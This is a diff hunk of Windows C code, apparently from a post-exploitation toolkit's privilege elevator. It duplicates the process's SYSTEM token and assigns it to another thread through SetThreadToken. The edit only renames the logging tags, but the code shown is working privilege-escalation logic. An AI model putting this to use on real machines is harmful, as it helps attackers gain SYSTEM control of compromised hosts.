@@ -26,34 +26,34 @@ BOOL elevator_tokendup( DWORD dwThreadId, DWORD dwSecurityRID )
 		pCheckTokenMembership = (CHECKTOKENMEMBERSHIP)GetProcAddress( LoadLibrary( "advapi32" ), "CheckTokenMembership" );
 		pOpenThread = (OPENTHREAD)GetProcAddress( LoadLibrary( "kernel32" ), "OpenThread" );
 		if( !pCheckTokenMembership || !pOpenThread )
-			BREAK_WITH_ERROR( "[ELEVATOR] elevator_thread. pCheckTokenMembership/pOpenthread == 0", ERROR_INVALID_HANDLE );
+			BREAK_WITH_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. pCheckTokenMembership/pOpenthread == 0", ERROR_INVALID_HANDLE );
 
 		if( !dwThreadId )
-			BREAK_WITH_ERROR( "[ELEVATOR] elevator_thread. dwThreadId == 0", ERROR_INVALID_HANDLE );
+			BREAK_WITH_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. dwThreadId == 0", ERROR_INVALID_HANDLE );
 
 		if( !OpenProcessToken( GetCurrentProcess(), TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY, &hProcessToken ) )
-			BREAK_ON_ERROR( "[ELEVATOR] elevator_thread. OpenToken failed" );
+			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. OpenToken failed" );
 
 		if( !AllocateAndInitializeSid( &NtAuthority, 1, dwSecurityRID, 0, 0, 0, 0, 0, 0, 0, &lpSystemSID ) )
-			BREAK_ON_ERROR( "[ELEVATOR] elevator_thread. AllocateAndInitializeSid failed" );
+			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. AllocateAndInitializeSid failed" );
 
 		if( !DuplicateToken( hProcessToken, SecurityImpersonation, &hToken ) )
-			BREAK_ON_ERROR( "[ELEVATOR] elevator_thread. DuplicateToken failed" );
+			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. DuplicateToken failed" );
 
 		if( !pCheckTokenMembership( hToken, lpSystemSID, &bIsSystem ) )
-			BREAK_ON_ERROR( "[ELEVATOR] elevator_thread. CheckTokenMembership failed" );
+			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. CheckTokenMembership failed" );
 
 		if( !bIsSystem )
-			BREAK_WITH_ERROR( "[ELEVATOR] elevator_thread. bIsSystem == FALSE", ERROR_INVALID_SID );
+			BREAK_WITH_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. bIsSystem == FALSE", ERROR_INVALID_SID );
 
 		hThread = pOpenThread( THREAD_ALL_ACCESS, TRUE, dwThreadId );
 		if( !hThread )
-			BREAK_ON_ERROR( "[ELEVATOR] elevator_thread. OpenThread failed" );
+			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. OpenThread failed" );
 
 		if( !SetThreadToken( &hThread, hToken ) )
-			BREAK_ON_ERROR( "[ELEVATOR] elevator_thread. SetThreadToken failed" );
+			BREAK_ON_ERROR( "[ELEVATOR-TOKENDUP] elevator_thread. SetThreadToken failed" );
 
-		dprintf( "[ELEVATOR] elevator_thread. Gave SYSTEM token to thread %d", dwThreadId );
+		dprintf( "[ELEVATOR-TOKENDUP] elevator_thread. Gave SYSTEM token to thread %d", dwThreadId );
 
 	} while( 0 );
 
